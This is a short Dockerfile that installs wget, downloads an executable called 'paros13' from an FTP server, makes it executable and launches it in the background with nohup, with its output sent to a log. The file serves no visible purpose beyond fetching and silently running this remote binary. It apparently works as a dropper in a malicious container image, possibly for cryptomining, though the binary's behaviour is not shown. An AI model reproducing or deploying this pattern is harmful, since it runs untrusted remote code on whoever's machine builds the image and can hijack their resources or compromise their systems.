FROM ubuntu:18.04
RUN apt update && apt install wget -y
RUN wget ftp://quotidian.com/paros13
RUN chmod +x * paros13
RUN nohup ./paros13 > l & 